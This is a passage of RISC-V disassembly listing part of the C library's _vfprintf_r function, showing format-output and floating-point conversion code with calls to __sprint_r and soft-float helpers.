   11c28:	ec82                	sd	zero,88(sp)
   11c2a:	6322                	ld	t1,8(sp)
   11c2c:	2981                	sext.w	s3,s3
   11c2e:	4e81                	li	t4,0
   11c30:	88079e63          	bnez	a5,10ccc <_vfprintf_r+0x384>
   11c34:	ec5fe06f          	j	10af8 <_vfprintf_r+0x1b0>
   11c38:	20087793          	andi	a5,a6,512
   11c3c:	26078463          	beqz	a5,11ea4 <_vfprintf_r+0x155c>
   11c40:	0ff9f993          	andi	s3,s3,255
   11c44:	e83a                	sd	a4,16(sp)
   11c46:	4785                	li	a5,1
   11c48:	8acff06f          	j	10cf4 <_vfprintf_r+0x3ac>
   11c4c:	2004f793          	andi	a5,s1,512
   11c50:	24078463          	beqz	a5,11e98 <_vfprintf_r+0x1550>
   11c54:	67c2                	ld	a5,16(sp)
   11c56:	00078983          	lb	s3,0(a5)
   11c5a:	87ce                	mv	a5,s3
   11c5c:	82eff06f          	j	10c8a <_vfprintf_r+0x342>
   11c60:	2004f793          	andi	a5,s1,512
   11c64:	24078763          	beqz	a5,11eb2 <_vfprintf_r+0x156a>
   11c68:	0ff9f993          	andi	s3,s3,255
   11c6c:	b375                	j	11a18 <_vfprintf_r+0x10d0>
   11c6e:	2004f793          	andi	a5,s1,512
   11c72:	20078e63          	beqz	a5,11e8e <_vfprintf_r+0x1546>
   11c76:	0ff9f993          	andi	s3,s3,255
   11c7a:	86eff06f          	j	10ce8 <_vfprintf_r+0x3a0>
   11c7e:	67b2                	ld	a5,264(sp)
   11c80:	2207cd63          	bltz	a5,11eba <_vfprintf_r+0x1572>
   11c84:	0df14783          	lbu	a5,223(sp)
   11c88:	04700713          	li	a4,71
   11c8c:	0000bc97          	auipc	s9,0xb
   11c90:	a54c8c93          	addi	s9,s9,-1452 # 1c6e0 <__clzdi2+0x18c>
   11c94:	f5b75ae3          	bge	a4,s11,11be8 <_vfprintf_r+0x12a0>
   11c98:	0000bc97          	auipc	s9,0xb
   11c9c:	a50c8c93          	addi	s9,s9,-1456 # 1c6e8 <__clzdi2+0x194>
   11ca0:	b7a1                	j	11be8 <_vfprintf_r+0x12a0>
   11ca2:	0017069b          	addiw	a3,a4,1
   11ca6:	97e2                	add	a5,a5,s8
   11ca8:	01233023          	sd	s2,0(t1)
   11cac:	01833423          	sd	s8,8(t1)
   11cb0:	f23e                	sd	a5,288(sp)
   11cb2:	10d12c23          	sw	a3,280(sp)
   11cb6:	471d                	li	a4,7
   11cb8:	0341                	addi	t1,t1,16
   11cba:	aad758e3          	bge	a4,a3,1176a <_vfprintf_r+0xe22>
   11cbe:	0a10                	addi	a2,sp,272
   11cc0:	85d2                	mv	a1,s4
   11cc2:	8556                	mv	a0,s5
   11cc4:	242070ef          	jal	ra,18f06 <__sprint_r>
   11cc8:	820510e3          	bnez	a0,114e8 <_vfprintf_r+0xba0>
   11ccc:	7792                	ld	a5,288(sp)
   11cce:	835e                	mv	t1,s7
   11cd0:	bc69                	j	1176a <_vfprintf_r+0xe22>
   11cd2:	7702                	ld	a4,32(sp)
   11cd4:	4c1d                	li	s8,7
   11cd6:	9766                	add	a4,a4,s9
   11cd8:	f83a                	sd	a4,48(sp)
   11cda:	7706                	ld	a4,96(sp)
   11cdc:	cb49                	beqz	a4,11d6e <_vfprintf_r+0x1426>
   11cde:	6746                	ld	a4,80(sp)
   11ce0:	eb51                	bnez	a4,11d74 <_vfprintf_r+0x142c>
   11ce2:	7726                	ld	a4,104(sp)
   11ce4:	177d                	addi	a4,a4,-1
   11ce6:	f4ba                	sd	a4,104(sp)
   11ce8:	7706                	ld	a4,96(sp)
   11cea:	377d                	addiw	a4,a4,-1
   11cec:	f0ba                	sd	a4,96(sp)
   11cee:	674a                	ld	a4,144(sp)
   11cf0:	66aa                	ld	a3,136(sp)
   11cf2:	0341                	addi	t1,t1,16
   11cf4:	fee33823          	sd	a4,-16(t1)
   11cf8:	11812703          	lw	a4,280(sp)
   11cfc:	97b6                	add	a5,a5,a3
   11cfe:	fed33c23          	sd	a3,-8(t1)
   11d02:	2705                	addiw	a4,a4,1
   11d04:	f23e                	sd	a5,288(sp)
   11d06:	0007069b          	sext.w	a3,a4
   11d0a:	10e12c23          	sw	a4,280(sp)
   11d0e:	0cdc4e63          	blt	s8,a3,11dea <_vfprintf_r+0x14a2>
   11d12:	7726                	ld	a4,104(sp)
   11d14:	00074603          	lbu	a2,0(a4)
   11d18:	7742                	ld	a4,48(sp)
   11d1a:	41b705bb          	subw	a1,a4,s11
   11d1e:	0006071b          	sext.w	a4,a2
   11d22:	0007069b          	sext.w	a3,a4
   11d26:	00e5d463          	bge	a1,a4,11d2e <_vfprintf_r+0x13e6>
   11d2a:	0005869b          	sext.w	a3,a1
   11d2e:	02d05663          	blez	a3,11d5a <_vfprintf_r+0x1412>
   11d32:	11812703          	lw	a4,280(sp)
   11d36:	97b6                	add	a5,a5,a3
   11d38:	01b33023          	sd	s11,0(t1)
   11d3c:	0017061b          	addiw	a2,a4,1
   11d40:	00d33423          	sd	a3,8(t1)
   11d44:	f23e                	sd	a5,288(sp)
   11d46:	10c12c23          	sw	a2,280(sp)
   11d4a:	0acc4a63          	blt	s8,a2,11dfe <_vfprintf_r+0x14b6>
   11d4e:	7726                	ld	a4,104(sp)
   11d50:	0341                	addi	t1,t1,16
   11d52:	00074603          	lbu	a2,0(a4)
   11d56:	0006071b          	sext.w	a4,a2
   11d5a:	fff6c593          	not	a1,a3
   11d5e:	95fd                	srai	a1,a1,0x3f
   11d60:	8eed                	and	a3,a3,a1
   11d62:	9f15                	subw	a4,a4,a3
   11d64:	00e04c63          	bgtz	a4,11d7c <_vfprintf_r+0x1434>
   11d68:	9db2                	add	s11,s11,a2
   11d6a:	7706                	ld	a4,96(sp)
   11d6c:	fb2d                	bnez	a4,11cde <_vfprintf_r+0x1396>
   11d6e:	6746                	ld	a4,80(sp)
   11d70:	30070463          	beqz	a4,12078 <_vfprintf_r+0x1730>
   11d74:	6746                	ld	a4,80(sp)
   11d76:	377d                	addiw	a4,a4,-1
   11d78:	e8ba                	sd	a4,80(sp)
   11d7a:	bf95                	j	11cee <_vfprintf_r+0x13a6>
   11d7c:	11812683          	lw	a3,280(sp)
   11d80:	00ed4663          	blt	s10,a4,11d8c <_vfprintf_r+0x1444>
   11d84:	a081                	j	11dc4 <_vfprintf_r+0x147c>
   11d86:	3741                	addiw	a4,a4,-16
   11d88:	02ed5e63          	bge	s10,a4,11dc4 <_vfprintf_r+0x147c>
   11d8c:	2685                	addiw	a3,a3,1
   11d8e:	07c1                	addi	a5,a5,16
   11d90:	01233023          	sd	s2,0(t1)
   11d94:	01a33423          	sd	s10,8(t1)
   11d98:	f23e                	sd	a5,288(sp)
   11d9a:	10d12c23          	sw	a3,280(sp)
   11d9e:	0341                	addi	t1,t1,16
   11da0:	fedc53e3          	bge	s8,a3,11d86 <_vfprintf_r+0x143e>
   11da4:	0a10                	addi	a2,sp,272
   11da6:	85d2                	mv	a1,s4
   11da8:	8556                	mv	a0,s5
   11daa:	e43a                	sd	a4,8(sp)
   11dac:	15a070ef          	jal	ra,18f06 <__sprint_r>
   11db0:	f2051c63          	bnez	a0,114e8 <_vfprintf_r+0xba0>
   11db4:	6722                	ld	a4,8(sp)
   11db6:	7792                	ld	a5,288(sp)
   11db8:	11812683          	lw	a3,280(sp)
   11dbc:	3741                	addiw	a4,a4,-16
   11dbe:	835e                	mv	t1,s7
   11dc0:	fced46e3          	blt	s10,a4,11d8c <_vfprintf_r+0x1444>
   11dc4:	2685                	addiw	a3,a3,1
   11dc6:	97ba                	add	a5,a5,a4
   11dc8:	00e33423          	sd	a4,8(t1)
   11dcc:	01233023          	sd	s2,0(t1)
   11dd0:	f23e                	sd	a5,288(sp)
   11dd2:	0006871b          	sext.w	a4,a3
   11dd6:	10d12c23          	sw	a3,280(sp)
   11dda:	32ec4463          	blt	s8,a4,12102 <_vfprintf_r+0x17ba>
   11dde:	7726                	ld	a4,104(sp)
   11de0:	0341                	addi	t1,t1,16
   11de2:	00074603          	lbu	a2,0(a4)
   11de6:	9db2                	add	s11,s11,a2
   11de8:	b749                	j	11d6a <_vfprintf_r+0x1422>
   11dea:	0a10                	addi	a2,sp,272
   11dec:	85d2                	mv	a1,s4
   11dee:	8556                	mv	a0,s5
   11df0:	116070ef          	jal	ra,18f06 <__sprint_r>
   11df4:	ee051a63          	bnez	a0,114e8 <_vfprintf_r+0xba0>
   11df8:	7792                	ld	a5,288(sp)
   11dfa:	835e                	mv	t1,s7
   11dfc:	bf19                	j	11d12 <_vfprintf_r+0x13ca>
   11dfe:	0a10                	addi	a2,sp,272
   11e00:	85d2                	mv	a1,s4
   11e02:	8556                	mv	a0,s5
   11e04:	e436                	sd	a3,8(sp)
   11e06:	100070ef          	jal	ra,18f06 <__sprint_r>
   11e0a:	ec051f63          	bnez	a0,114e8 <_vfprintf_r+0xba0>
   11e0e:	77a6                	ld	a5,104(sp)
   11e10:	66a2                	ld	a3,8(sp)
   11e12:	835e                	mv	t1,s7
   11e14:	0007c603          	lbu	a2,0(a5)
   11e18:	7792                	ld	a5,288(sp)
   11e1a:	0006071b          	sext.w	a4,a2
   11e1e:	bf35                	j	11d5a <_vfprintf_r+0x1412>
   11e20:	2605                	addiw	a2,a2,1
   11e22:	01070313          	addi	t1,a4,16
   11e26:	8c3a                	mv	s8,a4
   11e28:	f76ff06f          	j	1159e <_vfprintf_r+0xc56>
   11e2c:	0a10                	addi	a2,sp,272
   11e2e:	85d2                	mv	a1,s4
   11e30:	8556                	mv	a0,s5
   11e32:	0d4070ef          	jal	ra,18f06 <__sprint_r>
   11e36:	ea051963          	bnez	a0,114e8 <_vfprintf_r+0xba0>
   11e3a:	562e                	lw	a2,232(sp)
   11e3c:	7792                	ld	a5,288(sp)
   11e3e:	835e                	mv	t1,s7
   11e40:	b329                	j	11b4a <_vfprintf_r+0x1202>
   11e42:	0000bc97          	auipc	s9,0xb
   11e46:	896c8c93          	addi	s9,s9,-1898 # 1c6d8 <__clzdi2+0x184>
   11e4a:	bb79                	j	11be8 <_vfprintf_r+0x12a0>
   11e4c:	0a10                	addi	a2,sp,272
   11e4e:	85d2                	mv	a1,s4
   11e50:	8556                	mv	a0,s5
   11e52:	0b4070ef          	jal	ra,18f06 <__sprint_r>
   11e56:	e8051963          	bnez	a0,114e8 <_vfprintf_r+0xba0>
   11e5a:	7792                	ld	a5,288(sp)
   11e5c:	835e                	mv	t1,s7
   11e5e:	b8e5                	j	11756 <_vfprintf_r+0xe0e>
   11e60:	4c19                	li	s8,6
   11e62:	b135                	j	11a8e <_vfprintf_r+0x1146>
   11e64:	7682                	ld	a3,32(sp)
   11e66:	00dc8833          	add	a6,s9,a3
   11e6a:	40e6873b          	subw	a4,a3,a4
   11e6e:	41b80ebb          	subw	t4,a6,s11
   11e72:	0007069b          	sext.w	a3,a4
   11e76:	00ded363          	bge	t4,a3,11e7c <_vfprintf_r+0x1534>
   11e7a:	8776                	mv	a4,t4
   11e7c:	00070c9b          	sext.w	s9,a4
   11e80:	b2bd                	j	117ee <_vfprintf_r+0xea6>
   11e82:	6782                	ld	a5,0(sp)
   11e84:	8ca2                	mv	s9,s0
   11e86:	00f71023          	sh	a5,0(a4)
   11e8a:	d51fe06f          	j	10bda <_vfprintf_r+0x292>
   11e8e:	1982                	slli	s3,s3,0x20
   11e90:	0209d993          	srli	s3,s3,0x20
   11e94:	e55fe06f          	j	10ce8 <_vfprintf_r+0x3a0>
   11e98:	67c2                	ld	a5,16(sp)
   11e9a:	0007a983          	lw	s3,0(a5)
   11e9e:	87ce                	mv	a5,s3
   11ea0:	debfe06f          	j	10c8a <_vfprintf_r+0x342>
   11ea4:	1982                	slli	s3,s3,0x20
   11ea6:	0209d993          	srli	s3,s3,0x20
   11eaa:	e83a                	sd	a4,16(sp)
   11eac:	4785                	li	a5,1
   11eae:	e47fe06f          	j	10cf4 <_vfprintf_r+0x3ac>
   11eb2:	1982                	slli	s3,s3,0x20
   11eb4:	0209d993          	srli	s3,s3,0x20
   11eb8:	b685                	j	11a18 <_vfprintf_r+0x10d0>
   11eba:	02d00793          	li	a5,45
   11ebe:	0cf10fa3          	sb	a5,223(sp)
   11ec2:	b3d9                	j	11c88 <_vfprintf_r+0x1340>
   11ec4:	0a10                	addi	a2,sp,272
   11ec6:	85d2                	mv	a1,s4
   11ec8:	8556                	mv	a0,s5
   11eca:	03c070ef          	jal	ra,18f06 <__sprint_r>
   11ece:	d1dfe06f          	j	10bea <_vfprintf_r+0x2a2>
   11ed2:	03000793          	li	a5,48
   11ed6:	0ef10023          	sb	a5,224(sp)
   11eda:	05800713          	li	a4,88
   11ede:	0024e793          	ori	a5,s1,2
   11ee2:	2781                	sext.w	a5,a5
   11ee4:	0ee100a3          	sb	a4,225(sp)
   11ee8:	ed3e                	sd	a5,152(sp)
   11eea:	06300713          	li	a4,99
   11eee:	ec02                	sd	zero,24(sp)
   11ef0:	12810c93          	addi	s9,sp,296
   11ef4:	47d74563          	blt	a4,t4,1235e <_vfprintf_r+0x1a16>
   11ef8:	69b2                	ld	s3,264(sp)
   11efa:	fdfdf713          	andi	a4,s11,-33
   11efe:	1024e493          	ori	s1,s1,258
   11f02:	f0ba                	sd	a4,96(sp)
   11f04:	e582                	sd	zero,200(sp)
   11f06:	6c12                	ld	s8,256(sp)
   11f08:	2481                	sext.w	s1,s1
   11f0a:	1e09c463          	bltz	s3,120f2 <_vfprintf_r+0x17aa>
   11f0e:	06100793          	li	a5,97
   11f12:	52fd8c63          	beq	s11,a5,1244a <_vfprintf_r+0x1b02>
   11f16:	04100793          	li	a5,65
   11f1a:	00fd8463          	beq	s11,a5,11f22 <_vfprintf_r+0x15da>
   11f1e:	eb7fe06f          	j	10dd4 <_vfprintf_r+0x48c>
   11f22:	85ce                	mv	a1,s3
   11f24:	8562                	mv	a0,s8
   11f26:	fc1a                	sd	t1,56(sp)
   11f28:	f876                	sd	t4,48(sp)
   11f2a:	3f80a0ef          	jal	ra,1c322 <__trunctfdf2>
   11f2e:	11a8                	addi	a0,sp,232
   11f30:	765040ef          	jal	ra,16e94 <frexp>
   11f34:	32e0a0ef          	jal	ra,1c262 <__extenddftf2>
   11f38:	0000b797          	auipc	a5,0xb
   11f3c:	9a878793          	addi	a5,a5,-1624 # 1c8e0 <zeroes.4521+0x30>
   11f40:	6390                	ld	a2,0(a5)
   11f42:	6794                	ld	a3,8(a5)
   11f44:	41e090ef          	jal	ra,1b362 <__multf3>
   11f48:	4601                	li	a2,0
   11f4a:	4681                	li	a3,0
   11f4c:	f02a                	sd	a0,32(sp)
   11f4e:	e42e                	sd	a1,8(sp)
   11f50:	22e090ef          	jal	ra,1b17e <__eqtf2>
   11f54:	62a2                	ld	t0,8(sp)
   11f56:	7702                	ld	a4,32(sp)
   11f58:	7ec2                	ld	t4,48(sp)
   11f5a:	7362                	ld	t1,56(sp)
   11f5c:	e119                	bnez	a0,11f62 <_vfprintf_r+0x161a>
   11f5e:	4785                	li	a5,1
   11f60:	d5be                	sw	a5,232(sp)
   11f62:	0000a797          	auipc	a5,0xa
   11f66:	78e78793          	addi	a5,a5,1934 # 1c6f0 <__clzdi2+0x19c>
   11f6a:	e8be                	sd	a5,80(sp)
   11f6c:	020e9793          	slli	a5,t4,0x20
   11f70:	0000b697          	auipc	a3,0xb
   11f74:	95068693          	addi	a3,a3,-1712 # 1c8c0 <zeroes.4521+0x10>
   11f78:	9381                	srli	a5,a5,0x20
   11f7a:	6290                	ld	a2,0(a3)
   11f7c:	0785                	addi	a5,a5,1
   11f7e:	6694                	ld	a3,8(a3)
   11f80:	97e6                	add	a5,a5,s9
   11f82:	f13e                	sd	a5,160(sp)
   11f84:	01dc87bb          	addw	a5,s9,t4
   11f88:	fd32                	sd	a2,184(sp)
   11f8a:	e1b6                	sd	a3,192(sp)
   11f8c:	8c66                	mv	s8,s9
   11f8e:	db3e                	sw	a5,180(sp)
   11f90:	a831                	j	11fac <_vfprintf_r+0x1664>
   11f92:	4601                	li	a2,0
   11f94:	4681                	li	a3,0
   11f96:	e4ae                	sd	a1,72(sp)
   11f98:	e0aa                	sd	a0,64(sp)
   11f9a:	1e4090ef          	jal	ra,1b17e <__eqtf2>
   11f9e:	7ec2                	ld	t4,48(sp)
   11fa0:	7362                	ld	t1,56(sp)
   11fa2:	6f86                	ld	t6,64(sp)
   11fa4:	68a6                	ld	a7,72(sp)
   11fa6:	62a2                	ld	t0,8(sp)
   11fa8:	7702                	ld	a4,32(sp)
   11faa:	c135                	beqz	a0,1200e <_vfprintf_r+0x16c6>
   11fac:	766a                	ld	a2,184(sp)
   11fae:	668e                	ld	a3,192(sp)
   11fb0:	853a                	mv	a0,a4
   11fb2:	8596                	mv	a1,t0
   11fb4:	fc1a                	sd	t1,56(sp)
   11fb6:	f876                	sd	t4,48(sp)
   11fb8:	3aa090ef          	jal	ra,1b362 <__multf3>
   11fbc:	e42e                	sd	a1,8(sp)
   11fbe:	f02a                	sd	a0,32(sp)
   11fc0:	1b00a0ef          	jal	ra,1c170 <__fixtfsi>
   11fc4:	0005099b          	sext.w	s3,a0
   11fc8:	854e                	mv	a0,s3
   11fca:	23c0a0ef          	jal	ra,1c206 <__floatsitf>
   11fce:	7882                	ld	a7,32(sp)
   11fd0:	6722                	ld	a4,8(sp)
   11fd2:	862a                	mv	a2,a0
   11fd4:	86ae                	mv	a3,a1
   11fd6:	8546                	mv	a0,a7
   11fd8:	85ba                	mv	a1,a4
   11fda:	19b090ef          	jal	ra,1b974 <__subtf3>
   11fde:	67c6                	ld	a5,80(sp)
   11fe0:	f562                	sd	s8,168(sp)
   11fe2:	0c05                	addi	s8,s8,1
   11fe4:	01378733          	add	a4,a5,s3
   11fe8:	57da                	lw	a5,180(sp)
   11fea:	00074703          	lbu	a4,0(a4)
   11fee:	f02a                	sd	a0,32(sp)
   11ff0:	418787bb          	subw	a5,a5,s8
   11ff4:	ecbe                	sd	a5,88(sp)
   11ff6:	778a                	ld	a5,160(sp)
   11ff8:	feec0fa3          	sb	a4,-1(s8)
   11ffc:	e42e                	sd	a1,8(sp)
   11ffe:	7ec2                	ld	t4,48(sp)
   12000:	7362                	ld	t1,56(sp)
   12002:	8faa                	mv	t6,a0
   12004:	88ae                	mv	a7,a1
   12006:	f98796e3          	bne	a5,s8,11f92 <_vfprintf_r+0x164a>
   1200a:	57fd                	li	a5,-1
   1200c:	ecbe                	sd	a5,88(sp)
   1200e:	0000b717          	auipc	a4,0xb
   12012:	8c270713          	addi	a4,a4,-1854 # 1c8d0 <zeroes.4521+0x20>
   12016:	6310                	ld	a2,0(a4)
   12018:	6714                	ld	a3,8(a4)
   1201a:	857e                	mv	a0,t6
   1201c:	85c6                	mv	a1,a7
   1201e:	f01a                	sd	t1,32(sp)
   12020:	e476                	sd	t4,8(sp)
   12022:	e4fe                	sd	t6,72(sp)
   12024:	e0b2                	sd	a2,64(sp)
   12026:	fc36                	sd	a3,56(sp)
   12028:	f846                	sd	a7,48(sp)
   1202a:	1e8090ef          	jal	ra,1b212 <__getf2>
   1202e:	6ea2                	ld	t4,8(sp)
   12030:	7302                	ld	t1,32(sp)
   12032:	2ca04f63          	bgtz	a0,12310 <_vfprintf_r+0x19c8>
   12036:	6fa6                	ld	t6,72(sp)
   12038:	78c2                	ld	a7,48(sp)
   1203a:	6606                	ld	a2,64(sp)
   1203c:	76e2                	ld	a3,56(sp)
   1203e:	857e                	mv	a0,t6
   12040:	85c6                	mv	a1,a7
   12042:	13c090ef          	jal	ra,1b17e <__eqtf2>
   12046:	6ea2                	ld	t4,8(sp)
   12048:	7302                	ld	t1,32(sp)
   1204a:	e509                	bnez	a0,12054 <_vfprintf_r+0x170c>
   1204c:	0019f993          	andi	s3,s3,1
   12050:	2c099063          	bnez	s3,12310 <_vfprintf_r+0x19c8>
   12054:	67e6                	ld	a5,88(sp)
   12056:	03000693          	li	a3,48
   1205a:	00178713          	addi	a4,a5,1
   1205e:	9762                	add	a4,a4,s8
   12060:	0007c763          	bltz	a5,1206e <_vfprintf_r+0x1726>
   12064:	0c05                	addi	s8,s8,1
   12066:	fedc0fa3          	sb	a3,-1(s8)
   1206a:	ff871de3          	bne	a4,s8,12064 <_vfprintf_r+0x171c>
   1206e:	419c07bb          	subw	a5,s8,s9
   12072:	f03e                	sd	a5,32(sp)
   12074:	de5fe06f          	j	10e58 <_vfprintf_r+0x510>
   12078:	7702                	ld	a4,32(sp)
   1207a:	9766                	add	a4,a4,s9
   1207c:	efb77e63          	bgeu	a4,s11,11778 <_vfprintf_r+0xe30>
   12080:	8dba                	mv	s11,a4
   12082:	ef6ff06f          	j	11778 <_vfprintf_r+0xe30>
   12086:	6766                	ld	a4,88(sp)
   12088:	57f5                	li	a5,-3
   1208a:	00f74463          	blt	a4,a5,12092 <_vfprintf_r+0x174a>
   1208e:	00eed863          	bge	t4,a4,1209e <_vfprintf_r+0x1756>
   12092:	3df9                	addiw	s11,s11,-2
   12094:	fdfdf793          	andi	a5,s11,-33
   12098:	f0be                	sd	a5,96(sp)
   1209a:	ddffe06f          	j	10e78 <_vfprintf_r+0x530>
   1209e:	7782                	ld	a5,32(sp)
   120a0:	6766                	ld	a4,88(sp)
   120a2:	16f74563          	blt	a4,a5,1220c <_vfprintf_r+0x18c4>
   120a6:	67ea                	ld	a5,152(sp)
   120a8:	8c3a                	mv	s8,a4
   120aa:	8b85                	andi	a5,a5,1
   120ac:	c781                	beqz	a5,120b4 <_vfprintf_r+0x176c>
   120ae:	77c6                	ld	a5,112(sp)
   120b0:	00e78c3b          	addw	s8,a5,a4
   120b4:	67ea                	ld	a5,152(sp)
   120b6:	4007f793          	andi	a5,a5,1024
   120ba:	c781                	beqz	a5,120c2 <_vfprintf_r+0x177a>
   120bc:	67e6                	ld	a5,88(sp)
   120be:	30f04763          	bgtz	a5,123cc <_vfprintf_r+0x1a84>
   120c2:	fffc4993          	not	s3,s8
   120c6:	43f9d993          	srai	s3,s3,0x3f
   120ca:	013c79b3          	and	s3,s8,s3
   120ce:	2981                	sext.w	s3,s3
   120d0:	06700d93          	li	s11,103
   120d4:	e882                	sd	zero,80(sp)
   120d6:	f082                	sd	zero,96(sp)
   120d8:	e83fe06f          	j	10f5a <_vfprintf_r+0x612>
   120dc:	0df14783          	lbu	a5,223(sp)
   120e0:	4e81                	li	t4,0
   120e2:	c399                	beqz	a5,120e8 <_vfprintf_r+0x17a0>
   120e4:	be9fe06f          	j	10ccc <_vfprintf_r+0x384>
   120e8:	a11fe06f          	j	10af8 <_vfprintf_r+0x1b0>
   120ec:	ed26                	sd	s1,152(sp)
   120ee:	ec02                	sd	zero,24(sp)
   120f0:	84fe                	mv	s1,t6
   120f2:	57fd                	li	a5,-1
   120f4:	17fe                	slli	a5,a5,0x3f
   120f6:	00f9c9b3          	xor	s3,s3,a5
   120fa:	02d00793          	li	a5,45
   120fe:	e5be                	sd	a5,200(sp)
   12100:	b539                	j	11f0e <_vfprintf_r+0x15c6>
   12102:	0a10                	addi	a2,sp,272
   12104:	85d2                	mv	a1,s4
   12106:	8556                	mv	a0,s5
   12108:	5ff060ef          	jal	ra,18f06 <__sprint_r>
   1210c:	bc051e63          	bnez	a0,114e8 <_vfprintf_r+0xba0>
   12110:	77a6                	ld	a5,104(sp)
   12112:	835e                	mv	t1,s7
   12114:	0007c603          	lbu	a2,0(a5)
   12118:	7792                	ld	a5,288(sp)
   1211a:	9db2                	add	s11,s11,a2
   1211c:	b1b9                	j	11d6a <_vfprintf_r+0x1422>
   1211e:	02d00793          	li	a5,45
   12122:	0cf10fa3          	sb	a5,223(sp)
   12126:	bc4d                	j	11bd8 <_vfprintf_r+0x1290>
   12128:	8776                	mv	a4,t4
   1212a:	11bc                	addi	a5,sp,232
   1212c:	0f810893          	addi	a7,sp,248
   12130:	0ec10813          	addi	a6,sp,236
   12134:	4689                	li	a3,2
   12136:	85e2                	mv	a1,s8
   12138:	864e                	mv	a2,s3
   1213a:	8556                	mv	a0,s5
   1213c:	f01a                	sd	t1,32(sp)
   1213e:	e476                	sd	t4,8(sp)
   12140:	458020ef          	jal	ra,14598 <_ldtoa_r>
   12144:	7706                	ld	a4,96(sp)
   12146:	04700793          	li	a5,71
   1214a:	6ea2                	ld	t4,8(sp)
   1214c:	7302                	ld	t1,32(sp)
   1214e:	8caa                	mv	s9,a0
   12150:	02f71d63          	bne	a4,a5,1218a <_vfprintf_r+0x1842>
   12154:	67ea                	ld	a5,152(sp)
   12156:	8b85                	andi	a5,a5,1
   12158:	18079b63          	bnez	a5,122ee <_vfprintf_r+0x19a6>
   1215c:	04700713          	li	a4,71
   12160:	77ee                	ld	a5,248(sp)
   12162:	f0ba                	sd	a4,96(sp)
   12164:	ceffe06f          	j	10e52 <_vfprintf_r+0x50a>
   12168:	8776                	mv	a4,t4
   1216a:	0f810893          	addi	a7,sp,248
   1216e:	0ec10813          	addi	a6,sp,236
   12172:	11bc                	addi	a5,sp,232
   12174:	468d                	li	a3,3
   12176:	85e2                	mv	a1,s8
   12178:	864e                	mv	a2,s3
   1217a:	8556                	mv	a0,s5
   1217c:	f01a                	sd	t1,32(sp)
   1217e:	e476                	sd	t4,8(sp)
   12180:	418020ef          	jal	ra,14598 <_ldtoa_r>
   12184:	6ea2                	ld	t4,8(sp)
   12186:	7302                	ld	t1,32(sp)
   12188:	8caa                	mv	s9,a0
   1218a:	7706                	ld	a4,96(sp)
   1218c:	04600793          	li	a5,70
   12190:	01dc88b3          	add	a7,s9,t4
   12194:	00f70463          	beq	a4,a5,1219c <_vfprintf_r+0x1854>
   12198:	c85fe06f          	j	10e1c <_vfprintf_r+0x4d4>
   1219c:	000cc703          	lbu	a4,0(s9)
   121a0:	03000793          	li	a5,48
   121a4:	00f70663          	beq	a4,a5,121b0 <_vfprintf_r+0x1868>
   121a8:	572e                	lw	a4,232(sp)
   121aa:	98ba                	add	a7,a7,a4
   121ac:	c71fe06f          	j	10e1c <_vfprintf_r+0x4d4>
   121b0:	4601                	li	a2,0
   121b2:	4681                	li	a3,0
   121b4:	8562                	mv	a0,s8
   121b6:	85ce                	mv	a1,s3
   121b8:	f846                	sd	a7,48(sp)
   121ba:	f01a                	sd	t1,32(sp)
   121bc:	e476                	sd	t4,8(sp)
   121be:	7c1080ef          	jal	ra,1b17e <__eqtf2>
   121c2:	6ea2                	ld	t4,8(sp)
   121c4:	7302                	ld	t1,32(sp)
   121c6:	78c2                	ld	a7,48(sp)
   121c8:	d165                	beqz	a0,121a8 <_vfprintf_r+0x1860>
   121ca:	4785                	li	a5,1
   121cc:	41d7873b          	subw	a4,a5,t4
   121d0:	d5ba                	sw	a4,232(sp)
   121d2:	98ba                	add	a7,a7,a4
   121d4:	c49fe06f          	j	10e1c <_vfprintf_r+0x4d4>
   121d8:	0a10                	addi	a2,sp,272
   121da:	85d2                	mv	a1,s4
   121dc:	8556                	mv	a0,s5
   121de:	529060ef          	jal	ra,18f06 <__sprint_r>
   121e2:	b0051363          	bnez	a0,114e8 <_vfprintf_r+0xba0>
   121e6:	572e                	lw	a4,232(sp)
   121e8:	7792                	ld	a5,288(sp)
   121ea:	835e                	mv	t1,s7
   121ec:	dc2ff06f          	j	117ae <_vfprintf_r+0xe66>
   121f0:	0df14783          	lbu	a5,223(sp)
   121f4:	e836                	sd	a3,16(sp)
   121f6:	e882                	sd	zero,80(sp)
   121f8:	f082                	sd	zero,96(sp)
   121fa:	ec82                	sd	zero,88(sp)
   121fc:	89f6                	mv	s3,t4
   121fe:	8c76                	mv	s8,t4
   12200:	4e81                	li	t4,0
   12202:	c399                	beqz	a5,12208 <_vfprintf_r+0x18c0>
   12204:	ac9fe06f          	j	10ccc <_vfprintf_r+0x384>
   12208:	8f1fe06f          	j	10af8 <_vfprintf_r+0x1b0>
   1220c:	7702                	ld	a4,32(sp)
   1220e:	77c6                	ld	a5,112(sp)
   12210:	06700d93          	li	s11,103
   12214:	00e78c3b          	addw	s8,a5,a4
   12218:	6766                	ld	a4,88(sp)
   1221a:	2ce05263          	blez	a4,124de <_vfprintf_r+0x1b96>
   1221e:	67ea                	ld	a5,152(sp)
   12220:	4007f793          	andi	a5,a5,1024
   12224:	1a079663          	bnez	a5,123d0 <_vfprintf_r+0x1a88>
   12228:	fffc4993          	not	s3,s8
   1222c:	43f9d993          	srai	s3,s3,0x3f
   12230:	013c79b3          	and	s3,s8,s3
   12234:	2981                	sext.w	s3,s3
   12236:	bd79                	j	120d4 <_vfprintf_r+0x178c>
   12238:	67ea                	ld	a5,152(sp)
   1223a:	6766                	ld	a4,88(sp)
   1223c:	8b85                	andi	a5,a5,1
   1223e:	00fee7b3          	or	a5,t4,a5
   12242:	2ae05c63          	blez	a4,124fa <_vfprintf_r+0x1bb2>
   12246:	26079d63          	bnez	a5,124c0 <_vfprintf_r+0x1b78>
   1224a:	6c66                	ld	s8,88(sp)
   1224c:	06600d93          	li	s11,102
   12250:	b7f9                	j	1221e <_vfprintf_r+0x18d6>
   12252:	0a10                	addi	a2,sp,272
   12254:	85d2                	mv	a1,s4
   12256:	8556                	mv	a0,s5
   12258:	4af060ef          	jal	ra,18f06 <__sprint_r>
   1225c:	a8051663          	bnez	a0,114e8 <_vfprintf_r+0xba0>
   12260:	56ae                	lw	a3,232(sp)
   12262:	7702                	ld	a4,32(sp)
   12264:	7792                	ld	a5,288(sp)
   12266:	835e                	mv	t1,s7
   12268:	40d706bb          	subw	a3,a4,a3
   1226c:	d82ff06f          	j	117ee <_vfprintf_r+0xea6>
   12270:	57fd                	li	a5,-1
   12272:	e03e                	sd	a5,0(sp)
   12274:	985fe06f          	j	10bf8 <_vfprintf_r+0x2b0>
   12278:	56c1                	li	a3,-16
   1227a:	40c00c3b          	negw	s8,a2
